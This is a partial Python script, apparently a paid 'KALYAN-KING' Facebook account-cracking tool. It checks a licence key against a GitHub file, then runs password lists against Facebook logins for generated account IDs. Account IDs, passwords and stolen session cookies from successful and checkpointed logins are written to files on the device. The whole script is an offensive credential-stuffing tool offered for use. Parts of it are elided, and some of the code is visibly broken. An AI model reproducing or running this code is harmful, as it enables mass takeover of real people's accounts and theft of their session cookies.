...
input(' [•] Press Enter ')
os.system('xdg-open https://m.me/j/AbYCrQKfbzrIp9q2/')
...
logo=(f"""\
   d     S   sSSSs   d sss       sss sssss d sss   d s   sb 
S    P   S     S  S               S     S       S  S S S 
Ssss'   S         S               S     S       S   S  S 
S   s   S         S sSSs          S     S sSSs  S      S 
S    b  S    ssSb S               S     S       S      S 
S     b  S     S  S               S     S       S      S 
P     P   "sss"   P               P     P sSSss P      P 
                                                          \033[92;1m XD
\033[1;37m----------------------------------------------
 [•] Author     :  KALYAN-KING
 [•] Facebook   :  KALYAN-MITRO
 [•] Tool       :  PAID
 [•] Version    :  0.1
\033[1;37m----------------------------------------------""")
def linex():
...
def pp():
	...
	try:
			...
			li = ''.join(li)
			ck = requests.get(f'{https://github.com/Kallanooo12/Kallan_hak/blob/main/Avrolvel1.txt}').text
			if ky in ck:
				linex()
				...
				os.system('xdg-open https://www.facebook.com/profile.php?id=100080358373567?text=*HELLO*%2C%20*SIR*%20*I*%20*WANT*%20*TO*%20*YOUR*%20*kGF GUROP OWNER KALYAN *%20*TOOL*%20*PAID*%20*APPROVAL*%20/%20%20*My*%20*Key*%20*:*%20'+str(ky))
				pp()
...
def pak():
		user=[]
		clear()
		print('\033[1;35m Code example: 017,018,019,016')
...
def rd1(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [kALYAN-KING] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [KALYAN-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/KALYAN-R-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/KALYAN-R-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(ids))
                                        break
                                ...
                                if uid in oks:pass
                                        ...
                                        open('/sdcard/KALYAN-R-CP.txt','a').write(str(ids)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
...
def api(ids,names,passlist):
        try:
                ...
                sys.stdout.write('\r\r\033[1;37m [KALYAN-M2] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        ...
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        #print("\r\r\033[1;33m Cookie: "+coki)
                                        open('/sdcard/KALYAN-COKIE.txt','a').write(ids+' | '+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/KALYAN-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r \033[1;34m[KALYAN-2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                                        ...
                                        if 'y' in pcp:
                                                print('\r\r\x1b[38;5;205m [KALYAN-CP] '+ids+' | '+pas+'\033[1;97m')
                                                open('/sdcard/KALYAN-CP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                                cps.append(ids)
                                        else:
                                                open('/sdcard/KALYAN-CP.txt','a').write(ids+'|'+pas+'\n')
...
def api2(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [KALYAN-M1] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Aking:
                                ...
                                print('\r\r\033[1;32m [KALYAN-OK] %s | %s'%(ids,pas))
                                open('/sdcard/KALYAN-file-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                open('/sdcard/KALYAN-file-coki-OK.txt', 'a').write(ids+' | '+pas+' | '+kuki+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Aking:
                                if 'y' in pcp:
                                        ##########print('\r\r\x1b[38;5;208m [ZAIN-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/KALYAN-file-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
